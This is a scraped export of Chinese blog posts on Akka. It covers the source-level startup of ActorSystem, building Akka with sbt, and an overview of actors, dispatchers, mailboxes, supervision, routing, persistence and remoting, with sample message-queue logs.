通过跟踪AcotSystem的apply我们发现最终调用了以下代码，主要涉及了两个对象：ActorSystemSetup、ActorSystemImpl。 ActorSystemSetup 描述是“_A set of setup settings for programmatic configuration of the actor system._”很明显主要是提供一些可编程的配置，我们不再深入这个类。 ActorSystemImpl 是我们需要关心的类，因为ActorSystem.apply最终创建了这个类的实例。 1.3. 抽象实现 ActorSystemImpl由继承了ExtendedActorSystem，ExtendedActorSystem抽象类提供了有限的几个函数，暴露了ActorRefFactory中本来是protected的函数，也并没有具体的实现，我们也暂时忽略。 123456789101112/** * Scala API: Creates a new actor system with the specified name and settings * The core actor system settings are defined in [[BootstrapSetup]] */def apply(name: String, setup: ActorSystemSetup): ActorSystem = &#123; val bootstrapSettings = setup.get[BootstrapSetup] val cl = bootstrapSettings.flatMap(_.classLoader).getOrElse(findClassLoader()) val appConfig = bootstrapSettings.flatMap(_.config).getOrElse(ConfigFactory.load(cl)) val defaultEC = bootstrapSettings.flatMap(_.defaultExecutionContext) new ActorSystemImpl(name, appConfig, cl, defaultEC, None, setup).start()&#125; 2. 启动分析 由于ActorSystemImpl代码比较多，如果从头到尾读一遍代码效率比较低。而且从上面代码可以看出，apply在创建ActorSystemImpl实例之后，调用了start函数，那么我们就从start切入，看看做了哪些操作。 123456789101112131415private lazy val _start: this.type = try &#123; registerOnTermination(stopScheduler()) // the provider is expected to start default loggers, LocalActorRefProvider does this provider.init(this) if (settings.LogDeadLetters &gt; 0) logDeadLetterListener = Some(systemActorOf(Props[DeadLetterListener], &quot;deadLetterListener&quot;)) eventStream.startUnsubscriber() loadExtensions() if (LogConfigOnStart) logConfiguration() this&#125; catch &#123; case NonFatal(e) ⇒ try terminate() catch &#123; case NonFatal(_) ⇒ Try(stopScheduler()) &#125; throw e&#125; 其实start的代码还是比较清晰的:主要包含 registerOnTermination(stopScheduler()) provider.init(this) logDeadLetterListener loadExtensions()eventStream.startUnsubscriber() logConfiguration() 2.1 注册回调 首先用registerOnTermination注册了stopScheduler()，也就是给ActorSystem的退出注册了一个回调函数stopScheduler()，这一点也不再具体分析。 2.2. Provider初始化 provider.init(this)这段代码比较重要，从provider的类型来看，它是一个ActorRefProvider，前面我们已经分析过，这是一个用来创建actor的工厂类。provider初始化完成意味着就可以创建actor了，源码注释中也明确的说明了这一点。 12345678910111213val provider: ActorRefProvider = try &#123; val arguments = Vector( classOf[String] → name, classOf[Settings] → settings, classOf[EventStream] → eventStream, classOf[DynamicAccess] → dynamicAccess) dynamicAccess.createInstanceFor[ActorRefProvider](ProviderClass, arguments).get&#125; catch &#123; case NonFatal(e) ⇒ Try(stopScheduler()) throw e&#125; 上面是provider的创建过程，最重要的一段代码是dynamicAccess.createInstanceFor[ActorRefProvider](ProviderClass, arguments).get，它使用DynamicAccess创建了ActorRefProvider对象的实例。跟踪dynamicAccess创建我们发现这是一个ReflectiveDynamicAccess实例，其实这个类也比较简单，就是从ClassLoader中根据ProviderClass字段加载对应的类并创建对应的实例。ProviderClass定义如下，这是配置文件中经常看到的配置。目前的provider一共有三种：LocalActorRefProvider、akka.remote.RemoteActorRefProvider、akka.cluster.ClusterActorRefProvider，当然我们也可以自定义。 12345678910final val ProviderClass: String = setup.get[BootstrapSetup] .flatMap(_.actorRefProvider).map(_.identifier) .getOrElse(getString(&quot;akka.actor.provider&quot;)) match &#123; case &quot;local&quot; ⇒ classOf[LocalActorRefProvider].getName // these two cannot be referenced by class as they may not be on the classpath case &quot;remote&quot; ⇒ &quot;akka.remote.RemoteActorRefProvider&quot; case &quot;cluster&quot; ⇒ &quot;akka.cluster.ClusterActorRefProvider&quot; case fqcn ⇒ fqcn &#125; 自此provider创建结束，简单来说就是根据配置，通过Class._forName_加载了对应的ActorRefProvider实现类，并把当前的参数传给它，调用对应的构造函数，完成实例的创建。provider创建完成后调用init完成初始化，就可以创建actor了。 2.3. logDeadLetterListenerstart函数还创建了一个DeadLetterListener类型的actor，这也是我们经常会遇到的。如果给一个不存在的目标actor发消息，或者发送消息超时，都会把消息转发给这个DeadLetter。这就是一个普通的actor，主要用来接收没有发送成功的消息，并把消息打印出来。 2.4. eventStream.startUnsubscriber()后面还调用了eventStream.startUnsubscriber()，由于eventStream也不是我们关注的重点，先忽略。 2.5. loadExtensions() loadExtensions()功能也比较单一，就是根据配置加载ActorSystem的扩展类，并进行注册。 12345678910111213141516171819202122232425private def loadExtensions() &#123; /** * @param throwOnLoadFail Throw exception when an extension fails to load (needed for backwards compatibility) */ def loadExtensions(key: String, throwOnLoadFail: Boolean): Unit = &#123; immutableSeq(settings.config.getStringList(key)) foreach &#123; fqcn ⇒ dynamicAccess.getObjectFor[AnyRef](fqcn) recoverWith &#123; case _ ⇒ dynamicAccess.createInstanceFor[AnyRef](fqcn, Nil) &#125; match &#123; case Success(p: ExtensionIdProvider) ⇒ registerExtension(p.lookup()) case Success(p: ExtensionId[_]) ⇒ registerExtension(p) case Success(other) ⇒ if (!throwOnLoadFail) log.error(&quot;[&#123;&#125;] is not an &#x27;ExtensionIdProvider&#x27; or &#x27;ExtensionId&#x27;, skipping...&quot;, fqcn) else throw new RuntimeException(s&quot;[$fqcn] is not an &#x27;ExtensionIdProvider&#x27; or &#x27;ExtensionId&#x27;&quot;) case Failure(problem) ⇒ if (!throwOnLoadFail) log.error(problem, &quot;While trying to load extension [&#123;&#125;], skipping...&quot;, fqcn) else throw new RuntimeException(s&quot;While trying to load extension [$fqcn]&quot;, problem) &#125; &#125; &#125; // eager initialization of CoordinatedShutdown CoordinatedShutdown(this) loadExtensions(&quot;akka.library-extensions&quot;, throwOnLoadFail = true) loadExtensions(&quot;akka.extensions&quot;, throwOnLoadFail = false) &#125; 至此，我们就对ActorSystem的创建和启动分析完毕，但还有一些细节需要说明。 2.6. 变量初始化在start之前还是有一些其他字段的初始化。由于这些字段同样重要，且初始化的顺序没有太大关联，我就按照代码结构从上至下依次分析几个重要的字段。主要包含如下： threadFactory 12final val threadFactory: MonitorableThreadFactory = MonitorableThreadFactory(name, settings.Daemonicity, Option(classLoader), uncaughtExceptionHandler) threadFactory这是一个线程工厂类，默认是MonitorableThreadFactory，我们只需要记住这是一个线程工厂类，默认创建ForkJoinWorkerThread的线程就好了。 scheduler调度器 1val scheduler: Scheduler = createScheduler() scheduler是一个调度器，主要用来定时发送一些消息，这个我们也会经常遇到，但不是此次分析的重点，略过就好。 mailboxes 1val mailboxes: Mailboxes = new Mailboxes(settings, eventStream, dynamicAccess, deadLetters) mailboxes是一个非常重要的字段，它是Mailboxes一个实例，用来创建对应的Mailbox，Mailbox用来接收消息，并通过dispatcher分发给对应的actor。 dispatchers1234val dispatchers: Dispatchers = new Dispatchers(settings, DefaultDispatcherPrerequisites( threadFactory, eventStream, scheduler, dynamicAccess, settings, mailboxes, defaultExecutionContext)) val dispatcher: ExecutionContextExecutor = dispatchers.defaultGlobalDispatcher dispatchers是Dispatchers的一个实例，它用来创建、查询对应的MessageDispatcher。它有一个默认的全局dispatcher，从代码来看，它从配置中读取akka.actor.default-dispatcher，并创建MessageDispatcher实例。MessageDispatcher也是一个非常重要的类，我们后面再具体分析。 1234/** * The one and only default dispatcher. */def defaultGlobalDispatcher: MessageDispatcher = lookup(DefaultDispatcherId) 1234567object Dispatchers &#123; /** * The id of the default dispatcher, also the full key of the * configuration of the default dispatcher. */ final val DefaultDispatcherId = &quot;akka.actor.default-dispatcher&quot;&#125; 到这里我们就算分析完了ActorSystem的创建过程及其技术细节，当然ActorSystem创建只是第一步，后面需要创建actor，actor如何收到dispatcher的消息，还是需要进一步研究的。 ​ 3.参考https://www.cnblogs.com/gabry/p/9336477.html","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-源码构建","slug":"network/akka/Akka-源码构建","date":"2021-12-03T06:14:54.772Z","updated":"2021-12-03T08:41:18.467Z","comments":true,"path":"2021/12/03/network/akka/Akka-源码构建/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-%E6%BA%90%E7%A0%81%E6%9E%84%E5%BB%BA/","excerpt":"","text":"1.基础环境依赖 java scala sbt 2.构建 mac安装 1brew install sbt 编译 1sbt compile 测试 1sbt test 发布 1sbt publishLocal","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka系统介绍","slug":"network/akka/Akka系统介绍","date":"2021-12-03T01:45:14.437Z","updated":"2021-12-03T01:48:49.282Z","comments":true,"path":"2021/12/03/network/akka/Akka系统介绍/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"1.概述 Akka是一个开发库和运行环境，可以用于构建高并发、分布式、可容错、事件驱动的基于JVM的应用。 1.1 akka特性 易于构建并行和分布式应用 （Simple Concurrency &amp; Distribution） 比较容易构建分布式应用 可靠性（Resilient by Design） 系统具备自愈能力，在本地/远程都有监护。 高性能（High Performance） 在单机中每秒可发送50000000个消息。内存占用小，1GB内存中可保存2500000个actors。 弹性,无中心（Elastic — Decentralized） 自适应的负责均衡，路由，分区，配置 可扩展（Extensible） 可以使用Akka 扩展包进行扩展。 1.2 主要模块 akka-actors akka的核心，一个用于并发和分发的模型 akka-stream 一种直观而安全的方式来实现异步、非阻塞的回压流处理。 akka-http 现代的、快速的、异步的、流的HTTP服务器和客户端。 akka-cluster 通过在多个节点上分布您的系统来获得弹性和弹性。 akka-sharding 根据用户的身份，在集群中分配您的参与者。 Distributed Data 最终一致，高度读取和写入可用，低延迟数据 Akka Persistence 为参与者的事件包允许他们在重新启动后到达相同的状态。(持久化) Akka Management 在云系统上运行Akka系统的扩展（k8s，aws，…） Alpakka Akka流连接器用于集成其他技术1.3 优劣势 优势 事件驱动模型(Event-driven model) Actor 通过响应消息来执行工作。Actor 之间的通信是异步的，允许 Actor 发送消息并继续自己的工作，而不是阻塞等待响应。 强隔离原则(Strong isolation principles) 与 Java 中的常规对象不同，Actor 在调用的方法方面，没有一个公共 API。相反，它的公共 API 是通过 Actor 处理的消息来定义的。这可以防止 Actor 之间共享状态；观察另一个 Actor 状态的唯一方法是向其发送请求状态的消息。 位置透明(Location transparency) 系统通过工厂方法构造 Actor 并返回对实例的引用。因为位置无关紧要，所以 Actor 实例可以启动、停止、移动和重新启动，以向上和向下扩展以及从意外故障中恢复。 轻量级(Lightweight) 每个实例只消耗几百个字节，这实际上允许数百万并发 Actor 存在于一个应用程序中。 劣势 维护成本相对较高 排查问题修复问题困难 问题排查困难 部分模式下消息送达的不可预知2.Akka概念 Akka的关键要素 FSM: Actor状态维护 MailBox：消息队列 派发器：线程调度 序列化：java，pb 网络传输：netty 部分日志 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647access-appenequeue send.msg: Thread[default-remote-dispatcher-15,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue518854215 ActorSelectionMessage(&#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000,&quot;targetResourceId&quot;:&quot;test-target-id&quot;&#125;,Vector(user, NodeAvatar),false)dequeue send.msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue518854215 ActorSelectionMessage(&#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000,&quot;targetResourceId&quot;:&quot;test-target-id&quot;&#125;,Vector(user, NodeAvatar),false)enequeue send.msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1962688179 ActorSelectionMessage(&#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000,&quot;targetResourceId&quot;:&quot;test-target-id&quot;&#125;,Vector(user, NodeAvatar),false)dequeue send.msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1962688179 ActorSelectionMessage(&#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000,&quot;targetResourceId&quot;:&quot;test-target-id&quot;&#125;,Vector(user, NodeAvatar),false)enequeue msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1722048285 InboundPayload(size = 397 bytes)dequeue msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1722048285 InboundPayload(size = 397 bytes)enequeue msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1539873324 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;appMessage&quot;:&quot;msg_app_return_to_access&quot;,&quot;appId&quot;:10000,&quot;targetResourceId&quot;:&quot;test-target-id&quot;&#125;dequeue msg: Thread[default-dispatcher-28,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1539873324 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;appMessage&quot;:&quot;msg_app_return_to_access&quot;,&quot;appId&quot;:10000,&quot;targetResourceId&quot;:&quot;test-target-id&quot;&#125;enequeue send.msg: Thread[default-remote-dispatcher-7,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue518854215 ActorSelectionMessage(&#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000,&quot;targetResourceId&quot;:&quot;test-target-id&quot;&#125;,Vector(user, NodeAvatar),false)dequeue send.msg: Thread[default-remote-dispatcher-7,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue518854215 ActorSelectionMessage(&#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000,&quot;targetResourceId&quot;:&quot;test-target-id&quot;&#125;,Vector(user, NodeAvatar),false)enequeue send.msg: Thread[default-remote-dispatcher-7,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1962688179 ActorSelectionMessage(&#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000,&quot;targetResourceId&quot;:&quot;test-target-id&quot;&#125;,Vector(user, NodeAvatar),false)dequeue send.msg: Thread[default-remote-dispatcher-7,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1962688179 ActorSelectionMessage(&#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000,&quot;targetResourceId&quot;:&quot;test-target-id&quot;&#125;,Vector(user, NodeAvatar),false)enequeue msg: Thread[default-remote-dispatcher-7,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1722048285 InboundPayload(size = 397 bytes)dequeue msg: Thread[default-remote-dispatcher-7,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1722048285 InboundPayload(size = 397 bytes)enequeue msg: Thread[default-remote-dispatcher-7,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1859244097 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;appMessage&quot;:&quot;msg_app_return_to_access&quot;,&quot;appId&quot;:10000,&quot;targetResourceId&quot;:&quot;test-target-id&quot;&#125;dequeue msg: Thread[.default-dispatcher-28,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1859244097 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;appMessage&quot;:&quot;msg_app_return_to_access&quot;,&quot;appId&quot;:10000,&quot;targetResourceId&quot;:&quot;test-target-id&quot;&#125;app-accessenequeue msg: Thread[default-remote-dispatcher-13,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue2012634163 InboundPayload(size = 462 bytes)dequeue msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue2012634163 InboundPayload(size = 462 bytes)enequeue msg: Thread[SandBox-akka.actor.default-dispatcher-36,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1334187884 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000&#125;dequeue msg: Thread[SandBox-akka.actor.default-dispatcher-34,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1334187884 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000&#125;enequeue msg: Thread[SandBox-akka.actor.default-dispatcher-34,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue360110022 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000&#125;dequeue msg: Thread[SandBox-akka.actor.default-dispatcher-36,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue360110022 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000&#125;enequeue send.msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1624011765 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_app_return_to_access&quot;,&quot;appId&quot;:10000&#125;dequeue send.msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1624011765 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_app_return_to_access&quot;,&quot;appId&quot;:10000&#125;enequeue send.msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue787426676 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_app_return_to_access&quot;,&quot;appId&quot;:10000&#125;dequeue send.msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue787426676 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372980972,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_app_return_to_access&quot;,&quot;appId&quot;:10000&#125;enequeue msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue2012634163 InboundPayload(size = 462 bytes)dequeue msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue2012634163 InboundPayload(size = 462 bytes)enequeue msg: Thread[SandBox-akka.actor.default-dispatcher-34,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue464599832 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000&#125;dequeue msg: Thread[SandBox-akka.actor.default-dispatcher-2,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue464599832 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000&#125;enequeue msg: Thread[SandBox-akka.actor.default-dispatcher-2,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1322027443 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000&#125;dequeue msg: Thread[SandBox-akka.actor.default-dispatcher-34,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1322027443 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_access_to_app&quot;,&quot;appId&quot;:10000&#125;enequeue send.msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1624011765 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_app_return_to_access&quot;,&quot;appId&quot;:10000&#125;dequeue send.msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue1624011765 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_app_return_to_access&quot;,&quot;appId&quot;:10000&#125;enequeue send.msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue787426676 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_app_return_to_access&quot;,&quot;appId&quot;:10000&#125;dequeue send.msg: Thread[default-remote-dispatcher-5,5,main] que:class akka.dispatch.UnboundedMailbox$MessageQueue787426676 &#123;&quot;method&quot;:&quot;simple_app&quot;,&quot;headers&quot;:&#123;&#125;,&quot;timeSign&quot;:1638372990978,&quot;targetResourceId&quot;:&quot;test-target-id&quot;,&quot;appMessage&quot;:&quot;msg_app_return_to_access&quot;,&quot;appId&quot;:10000&#125; 123456789101112//收消息if (msg.message() instanceof IInnerMessage)&#123; &#125;//发消息if (msg.message() instanceof EndpointManager.Send)&#123; &#125;//payload数据if (msg.message() instanceof AssociationHandle.InboundPayload)&#123;&#125; 2.1 Akka-Actor actor类型(path+uid) (/)根actor (/user)用户actor,业务开发使用 system.actorOf(),user根路径 context.actorOf(),用户actor创建子路径 (system)系统actor 生命周期 actorOf 创建actor preStart actor对象创建调用，只调用一次 preRestart 调用postRestart，actor异常触发 stop 调用postStop，actor异常触发 收发消息 receive 接收消息 接收队列 分发器 消息应答 发送方noSender模式 无法回复，回复会出现死信 发送方携带Sender模式 getSender()模式:依赖actor上下文，重启积压消息无法送达 actorSelection(getSender().Path)模式,选择新的uid，重启积压消息可送达 ask 处理模型 异步处理 同步应答 处理流程 CompletableFuture c = new CompletableFuture&lt;&gt;(); AskableActorSelection askAble = new AskableActorSelection(akkaSelection); askAble.ask(xxx).onComplete{c.complete(xxx)} tell 处理模型 无业务返回应答,收消息成功Ack 处理流程 actorSelection(path).tell(xxx) getSender().tell(xxx) forward 特性 转发消息 携带发送者 场景 router模式下转发消息 调度器(分发器) Dispatcher: 一个基于事件的调度程序,它将一组 Actor 绑定到线程池，如果未指定调度器,则使用默认调度器。 可共享性：Unlimited 邮箱：任意，为每个 Actor 创建一个 用例：默认调度器，Bulkheading 驱动：java.util.concurrent.ExecutorService。使用fork-join-executor、thread-pool-executor或akka.dispatcher.ExecutorServiceConfigurator的FQCN指定的executor。 PinnedDispatcher： 这个调度器为每个使用它的 Actor 指定唯一的线程；即每个 Actor 将拥有自己的线程池，池中只有一个线程。 可共享性：None 邮箱：任意，为每个 Actor 创建一个 用例：Bulkheading 驱动：任何akka.dispatch.ThreadPoolExecutorConfigurator。默认情况下为thread-pool-executor。 CallingThreadDispatcher： 此调度器仅在当前调用的线程上运行。这个调度器不创建任何新的线程，但是它可以从不同的线程并发地用于同一个 Actor。有关详细信息和限制，请参阅「CallingThreadDispatcher」。 可共享性：Unlimited 邮箱：任意，为每个 Actor 创建一个（按需） 用例：Testing 驱动：调用线程（duh） 容错(错误处理) 监督策略 OneForOneStrategy 默认（推荐），父Actor只对出问题的子actor进行处理 AllForOneStrategy 父Actor对出问题的子actor以及他的所有兄弟节点进行处理 异常处理 继续（resume） ：Actor 继续处理下一条消息； 停止（stop） ：停 止 Actor，不再做任何操作； 重启（restart） ：新建一个 Actor，代替原来的 Actor； 向上反映（escalate） ：将异常信息传递给下一个监督者。 默认监督策略 ActorInitializationException将停止失败的子 Actor ActorKilledException将停止失败的子 Actor DeathPactException将停止失败的子 Actor Exception将重新启动失败的子 Actor 其他类型的Throwable将向上反映到父级 Actor 如果异常一直升级到根守护者，它将以与上面定义的默认策略相同的方式处理它。 邮箱 UnboundedMailbox 默认邮箱 底层是一个java.util.concurrent.ConcurrentLinkedQueue 阻塞: 否 有界: 否 配置名称：”unbounded” 或 “akka.dispatch.UnboundedMailbox” SingleConsumerOnlyUnboundedMailbox 底层是一个非常高效的多生产者单消费者队列，不能被用于BalancingDispatcher 阻塞: 否 有界: 否 配置名称：”akka.dispatch.SingleConsumerOnlyUnboundedMailbox” BoundedMailbox 底层是一个java.util.concurrent.LinkedBlockingQueue 阻塞: 是 有界: 是 配置名称：”bounded” 或 “akka.dispatch.BoundedMailbox” UnboundedPriorityMailbox 底层是一个java.util.concurrent.PriorityBlockingQueue 阻塞: 是 有界: 否 配置名称：”akka.dispatch.UnboundedPriorityMailbox” BoundedPriorityMailbox 底层是一个 java.util.PriorityBlockingQueue包装为akka.util.BoundedBlockingQueue 阻塞: 是 有界: 是 配置名称：”akka.dispatch.BoundedPriorityMailbox” 路由 router也是一种actor 类型 它路由到来的消息到其他的actors,其他那些actors就叫做routees(被路由对象) 路由策略 akka.routing.RoundRobinRoutingLogic_ _ 轮询 **akka.routing._RandomRoutingLogic _**随机 akka.routing._SmallestMailboxRoutingLogic __ _空闲 akka.routing.BroadcastRoutingLogic 广播 akka.routing.ScatterGatherFirstCompletedRoutingLogic 分散聚集 akka.routing._**TailChoppingRoutingLogic ** _尾部断续 akka.routing.ConsistentHashingRoutingLogic_ _一致性哈希 FSM(状态机) State(S) x Event(E) -&gt; Actions (A), State(S’) 如果我们处于状态S，并且事件E发生，那么我们应该执行操作A，并向状态S’过渡。 持久化(Persistence) 类型 内存堆日志 本机文件系统快照存储 LevelDB 消息投递策略（通过相应配置实现） at-most-once 意味着每条应用了这种机制的消息会被投递0次或1次。可以说这条消息可能会丢失。 at-least-once 意味着每条应用了这种机制的消息潜在的存在多次投递尝试并保证至少会成功一次。就是说这条消息可能会重复但是不会丢失。 exactly-once 意味着每条应用了这种机制的消息只会向接收者准确的发送一次。换言之，这种消息既不会丢失也不会重复2.3 Akka-Remote 状态 空闲(Idle) 无通信关联 活跃(Active) 发送消息或者入站连接成功 被守护(Gated) 远程链路通信失败(akka.remote.retry-gate-closed-for 参数控制时间),被守护状态可转换为空闲状态 被隔离(Quarantined) 通信失败无法恢复时会转换为(Quarantined)状态 序列化 Akka 提供了内置的支持序列化以及的扩展, 你可以使用内置的序列化功能，也可以扩展 配置 akka.actor.serializers.java=”akka.serialization.JavaSerializer” ​ 内置序列化 akka.serialization.JavaSerializer akka.remote.serialization.ProtobufSerializer 外部扩展 自定义序列化 io.altoo.akka.serialization.kryo.KryoSerializer 网络 netty tcp udp 3.主要流程3.1 发送消息 向远端发送消息分为两类：getSender().tell; actorSelection.tell(); getSender().tell,复用原有id，重启后原有消息会丢失，接受放会转变成deadletter actorSelection.tell()，基于路径和地址选用消息，id为有效id发送成功不会造成消息丢失 3.2 接受消息 业务触发 网络传递 4.注意事项 异常处理 